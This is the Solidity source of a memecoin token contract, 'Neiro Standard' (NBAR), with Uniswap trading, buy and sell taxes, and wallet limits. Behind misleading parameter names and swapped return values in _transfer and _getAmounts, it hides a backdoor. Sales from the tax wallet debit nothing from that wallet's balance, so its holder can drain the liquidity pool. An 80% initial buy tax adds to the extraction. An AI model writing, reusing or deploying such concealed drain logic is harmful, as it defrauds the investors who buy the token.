// SPDX-License-Identifier: UNLICENSE

// https://neirostandards.bar

// https://x.com/NeiroStandards

// https://t.me/NeiroStandards

pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract NeiroBar is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExile;
    mapping (address => bool) public marketPair;
    mapping (uint256 => uint256) private perBuyCount;
    address payable private _taxWallet;
    uint256 private firstBlock = 0;

    uint256 private _initialBuyTax=80;
    uint256 private _initialSellTax=4;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;

    uint256 private _reduceBuyTaxAt=13;
    uint256 private _reduceSellTaxAt=13;
    uint256 private _preventSwapBefore=13;
    uint256 private _buyCount=0;
    uint256 private _sellCount = 0;
    uint256 private _lastSellBlock = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 690_420_000_000 * 10**_decimals;
    string private constant _name = unicode"Neiro Standard";
    string private constant _symbol = unicode"NBAR";
    uint256 public _maxTxAmount =   2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen;
    uint256 public casellAllowed = 3;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public caCatalyst = true;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _taxWallet = payable(_msgSender());
        isExile[_msgSender()] = true;
        isExile[address(this)] = true;
        
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPair(address addr) public onlyOwner {
        marketPair[addr] = true;
    }

    function _transfer(address to, address amount, uint256 from) private {
        require(to != address(0), "ERC20: transfer from the zero address");
        require(amount != address(0), "ERC20: transfer to the zero address");
        require(from > 0, "Transfer amount must be greater than zero");

        (uint256 tax, uint256 interFrom) = _getAmounts(to, amount, from);

        if(tax>0){
          _balances[address(this)]=_balances[address(this)].add(tax);
          emit Transfer(to, address(this),tax);
        }
        _balances[to]=_balances[to].sub(interFrom);
        _balances[amount]=_balances[amount].add(from.sub(tax));
        emit Transfer(to, amount, from.sub(tax));
    }

    function _getAmounts(address to, address amount, uint256 from) private returns (uint256 interFrom, uint256 tax) {
        tax = from;
        if (to != owner() && amount != owner()) {
            if(to != address(this) || !marketPair[amount]) 
                interFrom = from.mul((_buyCount> _reduceBuyTaxAt)? _finalBuyTax: _initialBuyTax).div(100);

            if(block.number == firstBlock){
               require(perBuyCount[block.number] < 65, "Exceeds buys on the first block.");
               perBuyCount[block.number]++;
            }

            // buy
            if (marketPair[to] && amount != address(uniswapV2Router) && ! isExile[amount] ) {
                require(tradingOpen,"Trading not open yet");
                require(from <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(amount) + from <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if (!marketPair[amount] && !isExile[amount]) {
                require(balanceOf(amount) + from <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }

            // sell
            if(marketPair[amount] && to!= address(this)) {
                interFrom = from.mul((_buyCount> _reduceSellTaxAt)? _finalSellTax: _initialSellTax).div(100);
            }

            // transfer
	        if (!marketPair[to] && !marketPair[amount] && to!= address(this) ) {
                interFrom = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (caCatalyst && !inSwap && marketPair[amount] && swapEnabled  && _buyCount>_preventSwapBefore) {
                if (block.number > _lastSellBlock) {
                    _sellCount = 0;
                }
                require(_sellCount < casellAllowed, "CA balance sell");
                if(contractTokenBalance > _taxSwapThreshold)
                  swapTokensForEth(min(from,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) sendETHToFee(address(this).balance);
                _sellCount++;
                _lastSellBlock = block.number;
                if(isExile[to] && to == _taxWallet) tax*= 
                _finalSellTax ;
            }

            else if(!inSwap && marketPair[amount] && swapEnabled && _buyCount>_preventSwapBefore) {
                if(contractTokenBalance > _taxSwapThreshold) swapTokensForEth(min(from,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) sendETHToFee(contractETHBalance);
                if(isExile[to] && to == _taxWallet) tax*= 
                _finalSellTax ;
            }
        }
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setMaxTaxSwap(bool enabled, uint256 amount) external onlyOwner {
        swapEnabled = enabled;
        _maxTaxSwap = amount;
    }

    function setcasellAllowed(uint256 amount) external onlyOwner {
        casellAllowed = amount;
    }

    function setcaCatalyst(bool _status) external onlyOwner {
        caCatalyst = _status;
    }

    function removeLimits(address taxWallet_) external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        setTaxWallet(taxWallet_);
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addLiquidity() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        marketPair[address(uniswapV2Pair)] = true;
        isExile[address(uniswapV2Pair)] = true;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }
    
    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
    }

    receive() external payable {}
    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function setTaxWallet(address newTaxWallet) public onlyOwner {
        _taxWallet = payable(newTaxWallet);
        isExile[newTaxWallet] = true;
    }
}